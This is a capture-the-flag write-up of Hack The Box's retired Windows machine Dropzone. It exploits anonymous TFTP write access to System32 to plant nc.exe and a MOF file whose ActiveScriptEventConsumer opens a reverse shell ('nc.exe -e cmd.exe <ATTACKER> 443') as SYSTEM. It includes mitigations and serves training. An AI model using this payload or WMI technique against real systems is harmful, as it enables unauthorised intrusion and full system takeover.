---
machine: Dropzone
os: Windows
difficulty: Hard
platform: Hack The Box
state: Retired
tags: [windows, tftp, wmi, mof, privesc]
---

# Dropzone — Hack The Box (Windows)

[🇪🇸 Español](README.md) | **English**

> **State:** Retired. Reference writeup; no real flags or credentials.

## TL;DR

Anonymous TFTP exposes the `C:\` root and allows reading and writing `System32`, confirming execution as SYSTEM. Upload a MOF file to the WMI self-install directory; `mofcomp` processes it and an `ActiveScriptEventConsumer` runs a binary, yielding a SYSTEM shell.

## Recon

```bash
nmap -Pn -sU -sCV -p69 <IP>
nmap -Pn -p- --min-rate 5000 <IP>
```

- The TCP scan shows no useful ports; UDP/69 answers TFTP.
- The service allows uploading and downloading files without authentication.
- The TFTP root is `C:\`, not an isolated directory.

## Enumeration

- `tftp> put test.txt` and `get test.txt` work in the root.
- `get \windows\system32\eula.txt` identifies Windows XP SP3.
- Writing to `\windows\system32\` is possible, suggesting the service runs as SYSTEM.

## Foothold

Upload `nc.exe` in binary mode to `System32` and prepare a MOF file defining an `ActiveScriptEventConsumer` that runs `nc.exe -e cmd.exe`.

```text
#pragma namespace("\\\\.\\root\\cimv2")
instance of ActiveScriptEventConsumer as $cons {
  Name = "ASEC";
  ScriptingEngine = "JScript";
  ScriptText = "new ActiveXObject('Wscript.Shell').Run('nc.exe -e cmd.exe <ATTACKER> 443');";
};
instance of __EventFilter as $filt {
  Name = "instfilt";
  Query = "SELECT * FROM __InstanceCreationEvent WHERE TargetInstance.__class = 'MyClass'";
};
instance of __FilterToConsumerBinding as $bind { Consumer = $cons; Filter = $filt; };
```

## Lateral movement

There is no second host. The pivot is TFTP to the filesystem and then WMI: write the MOF to `C:\Windows\System32\wbem\mof\`, which `mofcomp` processes automatically.

```text
tftp> binary
tftp> put nc.exe \windows\system32\nc.exe
tftp> put payload.mof \windows\system32\wbem\mof\payload.mof
```

## Privilege escalation

The MOF is compiled and executed as SYSTEM; the resulting shell is `NT AUTHORITY\SYSTEM`. The file can be removed afterwards to clean up.

```cmd
whoami
type C:\Documents and Settings\Administrator\Desktop\root.txt
```

## Evidence

- Anonymous TFTP with read/write in the root.
- `eula.txt` identifying Windows XP SP3.
- `nc.exe` and `payload.mof` uploaded to `System32`.
- Shell as `NT AUTHORITY\SYSTEM`.

## Lessons learned

- Unauthenticated TFTP over `C:\` is arbitrary write as SYSTEM.
- WMI executes MOFs placed in the self-install directory.
- An old, forgotten service can give full control without a memory exploit.

## Mitigation and detection

- Disable TFTP or restrict it to an unprivileged directory.
- Monitor `wbem\mof` and WMI consumer creation.
- Apply least privilege to the TFTP service.

## References

- [0xdf — Dropzone](https://0xdf.gitlab.io/2018/11/03/htb-dropzone.html)
- [IppSec — Dropzone](https://www.youtube.com/watch?v=QzP5nUEhZeg)
- [Hack The Box — Dropzone](https://app.hackthebox.com/machines/dropzone)
